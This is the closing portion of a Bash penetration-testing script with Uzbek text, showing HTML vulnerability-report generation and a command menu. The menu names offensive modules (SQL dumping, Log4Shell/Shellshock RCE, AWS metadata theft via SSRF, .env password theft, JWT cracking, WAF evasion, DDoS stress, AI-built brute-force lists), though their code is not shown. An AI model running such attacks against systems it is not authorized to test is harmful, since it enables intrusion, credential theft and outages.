                    <span class="font-mono">$(date '+%Y-%m-%d %H:%M:%S')</span>
                </div>
            </div>
        </div>

        <!-- Summary Widgets -->
        <div class="grid grid-cols-1 md:grid-cols-3 gap-6 p-8 bg-gray-50 border-b border-gray-100">
            <div class="bg-white p-6 rounded-lg border-l-4 border-red-500 shadow-sm">
                <h3 class="text-gray-500 text-sm font-semibold uppercase">Jiddiy Zaifliklar</h3>
                <p class="text-4xl font-bold text-red-600 mt-2">$c_zaiflik</p>
            </div>
            <div class="bg-white p-6 rounded-lg border-l-4 border-yellow-500 shadow-sm">
                <h3 class="text-gray-500 text-sm font-semibold uppercase">Ogohlantirishlar</h3>
                <p class="text-4xl font-bold text-yellow-600 mt-2">$c_warn</p>
            </div>
            <div class="bg-white p-6 rounded-lg border-l-4 border-emerald-500 shadow-sm">
                <h3 class="text-gray-500 text-sm font-semibold uppercase">Xavfsiz / O'tgan testlar</h3>
                <p class="text-4xl font-bold text-emerald-600 mt-2">$c_pass</p>
            </div>
        </div>

        <!-- Report Content -->
        <div class="p-8">
            <h2 class="text-2xl font-bold text-gray-800 mb-6 border-b pb-2">Topilgan Zaifliklar (Dalillar bilan)</h2>
            <div class="space-y-4">
EOF
    
    # Bash orqali logika: faqat ZAIFLIK va ISBOT qatorlarni HTML ga aylantiramiz
    local in_vuln=false
    local vuln_title=""
    local vuln_proof=""
    
    while IFS= read -r line; do
        if echo "$line" | grep -q 'ZAIFLIK:'; then
            if [ "$in_vuln" = true ]; then
                # Oldingisini yopish
                echo "<div class='bg-red-50 border border-red-200 rounded-lg p-5'><h4 class='text-red-700 font-bold mb-2'>$vuln_title</h4><div class='bg-white border border-red-100 p-3 rounded font-mono text-sm break-words text-gray-700 mt-2'><span class='text-red-500 font-bold mr-2'>ISBOT:</span>$vuln_proof</div></div>" >> "$html_file"
            fi
            vuln_title=$(echo "$line" | sed 's/.*ZAIFLIK: //g')
            vuln_proof="Isbot matni taqdim etilmagan (yoki topishda xato yuz bergan)."
            in_vuln=true
        elif echo "$line" | grep -q 'ISBOT:'; then
            if [ "$in_vuln" = true ]; then
                vuln_proof=$(echo "$line" | sed 's/.*ISBOT: //g')
            fi
        fi
    done < "$txt_file"
    
    if [ "$in_vuln" = true ]; then
        echo "<div class='bg-red-50 border border-red-200 rounded-lg p-5'><h4 class='text-red-700 font-bold mb-2'>$vuln_title</h4><div class='bg-white border border-red-100 p-3 rounded font-mono text-sm break-words text-gray-700 mt-2'><span class='text-red-500 font-bold mr-2'>ISBOT:</span>$vuln_proof</div></div>" >> "$html_file"
    fi

    cat <<EOF >> "$html_file"
            </div>
            <p class="mt-8 text-sm text-gray-500 text-center">Ushbu xisobot ALIF24 Security Tool (V5.0) avtomatik ravishda ishlab chiqardi. <br>Barcha tizim huquqlari himoyalangan.</p>
        </div>
    </div>
</body>
</html>
EOF

    local size=$(du -sh "$html_file" | awk '{print $1}')
    echo -e "  ${GREEN}Muvaffaqiyatli! HTML Hisobot tayyor: $html_file -- $size${NC}"
    echo -e "  ${DIM}Faylni brauzerda ochib barcha isbotlarni ko'rishingiz mumkin.${NC}"
}

# ================================================================
# MAIN â€” Command Router
# ================================================================
case "${1:-full}" in
    recon)     cmd_recon ;;
    headers)   cmd_headers ;;
    ssl)       cmd_ssl ;;
    injection) cmd_injection ;;
    cors)      cmd_cors ;;
    dirs)      cmd_dirs ;;
    smartdirs) cmd_smartdirs ;;
    takeover)  cmd_takeover ;;
    wafbypass) cmd_wafbypass ;;
    idor)      cmd_idor ;;
    timing)    cmd_timing ;;
    logic)     cmd_logic ;;
    ports)     cmd_ports ;;
    cloud)     cmd_cloud ;;
    jwtcrack)  cmd_jwt_crack ;;
    graphql)   cmd_graphql ;;
    lfi)       cmd_lfi ;;
    ssrfaws)   cmd_ssrf_aws ;;
    js)        cmd_js_secrets ;;
    env)       cmd_env ;;
    gitdump)   cmd_gitdump ;;
    adminai)   cmd_admin_prank ;;
    wayback)   cmd_wayback ;;
    sqli)      cmd_sqli_dump ;;
    rce)       cmd_rce ;;
    wafai)     cmd_waf_ai ;;
    dnshijack) cmd_dns_hijack ;;
    chainpwn)  cmd_chain_pwn ;;
    doom)      cmd_doom ;;
    round2)    cmd_round2 ;;
    auth)      cmd_auth ;;
    ratelimit) cmd_ratelimit ;;
    stress)    cmd_stress "$2" ;;
    api)       cmd_api ;;
    html)      cmd_report ;;
    report)    cmd_report ;;
    full)      cmd_full ;;
    help|--help|-h)
        echo ""
        echo -e "${RED}${BOLD}  ALIF24 PENTEST TOOL v12.0-ROUND2 (AI vs INSON MUSOBAQASI)${NC}"
        echo ""
        echo -e "  ${BOLD}Ishlatish:${NC} bash pentest.sh [command] [args]"
        echo ""
        echo -e "  ${BOLD}Buyruqlar:${NC}"
        echo "    bosh           To'liq pentest hammasi"
        echo "    recon         Reconnaissance - malumot yig'ish"
        echo "    headers       HTTP Security Headers audit"
        echo "    ssl           SSL/TLS zaifliklar"
        echo "    injection     SQL Injection va XSS tekshiruvi"
        echo "    cors          CORS misconfiguration"
        echo "    dirs          Yashirin fayllar / papkalar qidirish"
        echo "    auth          Autentifikatsiya zaifliklar"
        echo "    ratelimit     Rate Limiting tekshiruvi"
        echo "    stress [N]    DDoS Stress test - N concurrent, default: 50"
        echo "    timing        Timing Attack (Javob vaqti tahlili)"
        echo "    api           API Fuzzing - notogri malumot"
        echo "    logic         Business Logic Flaws (Narx/summa maniypulasiyasi)"
        echo "    ports         Infrastructure Port Scanner (DevOps xatolari)"
        echo "    cloud         AWS S3 / Firebase ochiq omborlari tahlili"
        echo "    jwtcrack      JWT maxfiy kalitini offline buzish (Brute-force)"
        echo "    graphql       GraphQL Introspection Schema o'g'irlash !YANGI"
        echo "    lfi           Local File Inclusion (Server fayllarini o'qish) !YANGI"
        echo "    ssrfaws       AWS Cloud SSRF orqali Metadata kalit og'irlash !YANGI"
        echo "    js            JS kodlardan ochiq qolib ketgan API_KEY/Sirlarni tortib olish !YANGI (MAGIYA)"
        echo "    env           Sayt konfiglari va .env orqali DB parollar o'g'irlash !QIYOMAT"
        echo "    gitdump       Ochiq qolgan .git orqali kodni tutqazish !QIYOMAT"
        echo "    adminai       AI orqali maqsadli bruteforce yasab Adminni prank qilish !QIYOMAT"
        echo "    wayback       Vaqt Mashinasi: o'chirilgan yashirin fayllarni arxivdan topish !OMEGA"
        echo "    sqli          SQL Database versiyasi va jadvallarini error orqali ko'chirish !OMEGA"
        echo "    rce           Log4Shell va Shellshock orqali server yadrosini (Terminalini) boshqarish !OMEGA"
        echo "    wafai         WAF Firewall (Cloudflare) larni mutatsyalashgan payload (Polymorph) bilan aldash !SKYNET"
        echo "    dnshijack     Tizim tagidagi unutilgan domenlarni (CNAME/S3) tortib olish !SKYNET"
        echo "    chainpwn      To'liq Avtonom xujum: Topilgan xatoni ikkinchisiga ulab to'liq egalik qilib olish !SKYNET"
        echo "    doom          RAUND 1: Swagger o'g'irlash va Server Memory Stack xotirasini portlatash !FINAL"
        echo "    round2        RAUND 2: CORS Hijack va Host Header Poisoning xujumlari orqali backend ishonchini sindirish !FINAL"
        echo "    html          HTML/Tailwind hisobot (.html fayl generatsiya)"
        echo "    report        Natijalarni oddiy faylga (.txt maxfiy) saqlash"
        echo ""
        echo -e "  ${BOLD}Target ozgartirish:${NC}"
        echo "    PENTEST_TARGET=https://harf.alif24.uz bash pentest.sh"
        echo ""
        echo -e "  ${RED}FAQAT OZ SAYTINGIZDA ISHLATING!${NC}"
        echo ""
        ;;
    *)
        echo -e "${RED}Nomalum buyruq: $1${NC}"
        echo "bash pentest.sh help"
        ;;
esac
